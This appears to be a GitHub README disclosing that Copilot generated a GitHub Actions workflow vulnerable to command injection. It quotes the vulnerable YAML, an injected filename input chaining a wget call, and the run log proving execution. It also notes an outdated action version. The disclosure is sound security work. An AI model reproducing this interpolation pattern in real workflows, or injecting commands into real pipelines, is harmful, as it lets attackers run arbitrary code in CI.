# copilot-gha-vul-command-injection

Today 2024-12-18, GitHub copilot is [General Availabe](https://github.blog/changelog/2024-12-18-copilot-chat-on-github-is-now-generally-available-for-all-users/), anyone can use GitHub Copilot for free at https://github.com/copilot or with editor like VSCode.

Using the latest model GPT 4o, I tried to create a GitHub action to run a command with user input. The generated code at https://github.com/hvnsweeting/copilot-gha-vul-command-injection/blob/main/.github/workflows/run-python-script.yml , main part:

```yaml

    - name: Run Python script
      run: python main.py ${{ github.event.inputs.filename }}

    - name: Create Pull Request
      uses: peter-evans/create-pull-request@v3

```
 could work after some modifcation i.e. [allow action to WRITE](https://github.com/ad-m/github-push-action/issues/96#issuecomment-889984928), it has serious security issues:

## Command injection
Users who can run the action (e.g in an org) can execute any command by add `; command` to the filename input. For example here run with filename

```
input.txt; wget -O- https://httpbin.org/get 
```

and result is


```

Run python main.py input.txt; wget -O- https://httpbin.org/get 
  python main.py input.txt; wget -O- https://httpbin.org/get 
  shell: /usr/bin/bash -e {0}
  env:
    pythonLocation: /opt/hostedtoolcache/Python/3.12.8/x64
    LD_LIBRARY_PATH: /opt/hostedtoolcache/Python/3.12.8/x64/lib
--2024-12-19 13:42:12--  https://httpbin.org/get
Resolving httpbin.org (httpbin.org)... 34.226.108.155, 98.85.100.80
Connecting to httpbin.org (httpbin.org)|34.226.108.155|:443... connected.
HTTP request sent, awaiting response... 200 OK
...
```
https://github.com/hvnsweeting/copilot-gha-vul-command-injection/actions/runs/12413871568/job/34656690134

This vul is so popular, it is always on top 10 OWASP https://owasp.org/www-community/attacks/Command_Injection
that's maybe the reason Copilot **learned** it.

## Use old version of action

```
create-pull-request@v3
```
Current version is v7

v3 was released `Feb 28, 2022`, there were 366 commits between them https://github.com/peter-evans/create-pull-request/compare/v3...v7

### Mitigation

While this is buried under "Security" section of GitHub Action docs, user who use GitHub copilot likely won't every open it. 

https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#example-of-a-script-injection-attack

### Should not trust Copilot than anyone on internet :joy: